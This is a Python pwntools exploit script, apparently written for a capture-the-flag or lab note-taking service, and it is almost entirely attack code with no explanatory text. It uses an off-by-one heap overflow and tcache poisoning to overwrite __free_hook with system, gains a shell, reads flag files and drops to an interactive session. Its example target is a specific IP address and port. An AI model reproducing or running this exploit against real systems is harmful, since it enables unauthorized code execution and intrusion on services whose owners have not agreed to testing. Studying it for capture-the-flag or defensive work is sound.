#!/usr/bin/env python3
"""
Automatic Note-Taking Service Pwn
Just provide host:port and this handles everything
"""

from pwn import *
import sys
import re

context.log_level = 'info'

def auto_exploit(target):
    """Automatically exploit the service"""
    
    # Parse target
    if ':' in target:
        host, port = target.split(':')
        port = int(port)
    else:
        print("[!] Usage: python auto_pwn_notes.py <host:port>")
        print("[!] Example: python auto_pwn_notes.py 138.199.163.92:12345")
        return
    
    print(f"[*] Targeting {host}:{port}")
    
    try:
        # Connect
        io = remote(host, port)
        print("[+] Connected!")
        
        # Get initial output with leaked addresses
        print("[*] Receiving leaked addresses...")
        banner = io.recvuntil(b'>', timeout=5)
        print(banner.decode(errors='ignore'))
        
        # Parse any leaked addresses
        addrs = re.findall(rb'0x[0-9a-fA-F]+', banner)
        leaked = {}
        for addr_bytes in addrs:
            addr = int(addr_bytes, 16)
            print(f"[*] Found address: 0x{addr:016x}")
            
            # Identify address type
            if addr > 0x7f0000000000 and addr < 0x800000000000:
                leaked['libc'] = addr
                print(f"[+] Libc address: 0x{addr:016x}")
            elif addr > 0x555555554000 and addr < 0x556000000000:
                leaked['pie'] = addr
                print(f"[+] PIE address: 0x{addr:016x}")
            elif addr > 0x7ffffffd0000:
                leaked['stack'] = addr
                print(f"[+] Stack address: 0x{addr:016x}")
        
        # Strategy: Off-by-one heap exploitation
        print("\n[*] Starting heap exploitation...")
        
        # Create notes to set up heap
        def create(size, data):
            io.sendlineafter(b'>', b'1')
            io.sendlineafter(b':', str(size).encode())
            io.sendlineafter(b':', data)
            
        def edit(idx, data):
            io.sendlineafter(b'>', b'2')
            io.sendlineafter(b':', str(idx).encode())
            io.sendlineafter(b':', data)
            
        def delete(idx):
            io.sendlineafter(b'>', b'3')
            io.sendlineafter(b':', str(idx).encode())
            
        def show(idx):
            io.sendlineafter(b'>', b'4')
            io.sendlineafter(b':', str(idx).encode())
            return io.recvuntil(b'>', timeout=2)
        
        # Heap feng shui
        print("[*] Creating heap layout...")
        create(0x88, b'A' * 0x80)  # 0
        create(0x88, b'B' * 0x80)  # 1 - victim
        create(0x88, b'C' * 0x80)  # 2 - barrier
        
        # Off-by-one: corrupt next chunk size
        print("[*] Triggering off-by-one...")
        payload = b'X' * 0x88 + b'\x91'  # Overwrite size field
        edit(0, payload)
        
        # Free corrupted chunk
        print("[*] Freeing corrupted chunk...")
        delete(1)
        
        # Reallocate smaller to create overlap
        print("[*] Creating overlap...")
        create(0x48, b'Y' * 0x40)  # 1
        
        # Now we have overlap - try to leak libc
        print("[*] Attempting libc leak...")
        try:
            leak_data = show(2)
            if len(leak_data) >= 8:
                libc_leak = u64(leak_data[:8].ljust(8, b'\x00'))
                if libc_leak > 0x7f0000000000:
                    leaked['libc_leak'] = libc_leak
                    print(f"[+] Leaked libc: 0x{libc_leak:016x}")
        except:
            pass
        
        # If we have libc, calculate offsets
        if 'libc' in leaked or 'libc_leak' in leaked:
            libc_base = leaked.get('libc', leaked.get('libc_leak', 0))
            
            # Common libc offsets (may need adjustment)
            system_offset = 0x50d60
            free_hook_offset = 0x1eee48
            binsh_offset = 0x1d8698
            
            system_addr = libc_base + system_offset
            free_hook = libc_base + free_hook_offset
            binsh = libc_base + binsh_offset
            
            print(f"[+] system: 0x{system_addr:016x}")
            print(f"[+] __free_hook: 0x{free_hook:016x}")
            print(f"[+] /bin/sh: 0x{binsh:016x}")
            
            # Overwrite __free_hook with system
            print("[*] Overwriting __free_hook...")
            
            # Create more chunks for tcache poisoning
            create(0x88, b'D' * 0x80)  # 3
            create(0x88, b'E' * 0x80)  # 4
            
            # Use overlap to corrupt fd pointer
            payload = b'Z' * 0x48
            payload += p64(0x91)  # size
            payload += p64(free_hook)  # fd -> __free_hook
            edit(1, payload)
            
            # Allocate to get chunk at __free_hook
            create(0x88, b'F' * 0x80)  # 5
            create(0x88, p64(system_addr))  # 6 - write system to __free_hook
            
            # Trigger free("/bin/sh")
            print("[*] Triggering system('/bin/sh')...")
            create(0x20, b'/bin/sh\x00')  # 7
            delete(7)  # This calls system("/bin/sh")
        
        # Try to get shell
        print("\n[*] Checking for shell...")
        io.sendline(b'id')
        try:
            response = io.recvline(timeout=2)
            if b'uid=' in response:
                print("[+] SHELL OBTAINED!")
                print(response.decode())
                
                # Get flag
                io.sendline(b'ls -la')
                print(io.recv(timeout=2).decode(errors='ignore'))
                
                io.sendline(b'cat flag.txt')
                flag = io.recvline(timeout=2)
                if flag:
                    print(f"\n{'='*60}")
                    print(f"FLAG: {flag.decode().strip()}")
                    print(f"{'='*60}\n")
                
                io.sendline(b'cat flag')
                flag2 = io.recvline(timeout=2)
                if flag2:
                    print(f"FLAG: {flag2.decode().strip()}")
                
                io.sendline(b'find / -name "*flag*" 2>/dev/null')
                print(io.recv(timeout=3).decode(errors='ignore'))
                
                return True
        except:
            pass
        
        # Interactive fallback
        print("[*] Dropping to interactive mode...")
        io.interactive()
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("="*60)
        print("AUTOMATIC NOTE-TAKING SERVICE EXPLOIT")
        print("="*60)
        print("\nUsage: python auto_pwn_notes.py <host:port>")
        print("\nExample:")
        print("  python auto_pwn_notes.py 138.199.163.92:12345")
        print("\nWaiting for connection details from lab...")
        print("Once you have them, run this script with host:port")
        sys.exit(1)
    
    target = sys.argv[1]
    auto_exploit(target)
